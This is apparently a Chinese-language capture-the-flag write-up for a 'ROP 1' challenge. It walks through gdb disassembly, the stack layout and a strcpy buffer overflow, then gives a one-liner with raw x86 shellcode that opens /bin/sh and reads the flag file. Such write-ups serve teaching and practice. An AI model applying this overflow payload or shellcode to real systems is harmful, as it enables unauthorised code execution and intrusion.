# ROP 1
執行檔被ASLR保護的時候，就是使用如標題[return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming)的時候了！
 * 編譯好後，打開gdb，看提示說的`%eax`有什麼用：
```
$ gdb -q rop1
Reading symbols from rop1...(no debugging symbols found)...done.
(gdb) disass vuln
Dump of assembler code for function vuln:
   0x08048e60 <+0>:	push   %ebp
   0x08048e61 <+1>:	mov    %esp,%ebp
   0x08048e63 <+3>:	sub    $0x48,%esp; buf
   0x08048e66 <+6>:	sub    $0x8,%esp; name
   0x08048e69 <+9>:	pushl  0x8(%ebp); argument name of strcpy
   0x08048e6c <+12>:	lea    -0x48(%ebp),%eax; load buf -> %eax!
   0x08048e6f <+15>:	push   %eax; argument buf of strcpy
   0x08048e70 <+16>:	call   0x80481e0; calling strcpy
   0x08048e75 <+21>:	add    $0x10,%esp
   0x08048e78 <+24>:	leave
   0x08048e79 <+25>:	ret
End of assembler dump.
```
 * `%eax`存著指到buf的pointer，而且會**被strcpy執行**！
 * 看看我們想呼叫的be_nice_to_people在哪：
```
(gdb) print be_nice_to_people
$1 = {<text variable, no debug info>} 0x8048e3c <be_nice_to_people>
```
 * 目前stack長相：
```
| <ret addr>
| <old %ebp>   <= %ebp
| <buf..0x48
|  bytes..long>
| <addr-name>
| <addr -buf>   <= %esp
```
 * overflow ```0x8048e3c``` 到<ret addr>
```bash
$ ./rop1 "$(python -c 'print "A" * 0x48 + "A" * 4 + "\x3c\x8e\x04\x08"')"
Illegal instruction (core dumped)
```
 * bingo！接下來，替換成開啟shell的shellcode：
```
$ ./rop1 "$(python -c 'print "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "A" * 36 + "\x3c\x8e\x04\x08"')"
$ ls
Makefile    flag.txt    rop1    rop1.c
$ cat flag.txt
theres_no_need_to_guess
```
